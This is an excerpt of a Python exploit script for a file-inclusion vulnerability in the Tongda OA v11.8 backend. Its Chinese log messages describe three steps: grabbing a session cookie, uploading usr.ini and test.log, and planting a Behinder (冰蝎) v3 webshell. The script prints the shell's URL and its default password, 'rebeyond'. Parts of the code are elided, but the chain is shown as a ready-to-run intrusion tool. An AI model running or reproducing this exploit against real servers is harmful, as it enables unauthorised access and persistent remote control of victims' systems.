...
def main(target_url):
    ...
    if target_url[-1] != '/':
        target_url += '/'
    Cookie = ''
    print(now_time() + " [INFO]     正在检测通达OA v11.8 后台文件包含xxs")
    print(now_time() + " [INFO]     正在尝试获取Cookie")
    for i in range(1, 1000):
        ...
        if future1.result() != None:
            ...
            print(now_time() + ' [WARNING]  通达OA v11.8 后台文件包含漏洞利用失败，未能获取Cookie')
            break
    headers = {
    ...
    try:
        ...
        if "档案已保存" in response.text and response.status_code == 200:
            print(now_time() + ' [SUCCESS]  成功上传usr.ini')
            POC_2(target_url, Cookie)
        else:
            print(now_time() + ' [WARNING]  上传usr.ini失败漏洞不存在')
    except:
        print(now_time() + " [ERROR]    无法利用poc1请求目标或被目标拒绝请求, ")
...
def POC_2(target_url, Cookie):
    ...
    try:
        ...
        if "档案已保存" in response.text and response.status_code == 200:
            print(now_time() + ' [SUCCESS]  成功上传test.log')
            POC_3(target_url, Cookie)
        else:
            print(now_time() + ' [WARNING]  上传test.log失败漏洞不存在')

    except:
        print(now_time() + " [ERROR]    无法利用poc2请求目标或被目标拒绝请求, ")
...
def POC_3(target_url, Cookie):
    ...
    try:
        ...
        if res.status_code == 200 and 'it work' in res.text:
            print(now_time() + ' [SUCCESS]  存在漏洞，成功上传冰蝎三Shell, 密码为: rebeyond:{}'.format(
                target_url + payload))
        else:
            print(now_time() + ' [WARNING]  不存在漏洞，或请稍等连接木马:{}'.format(target_url + payload))
    except:
        print(now_time() + " [ERROR]    无法利用poc3请求目标或被目标拒绝请求, ")
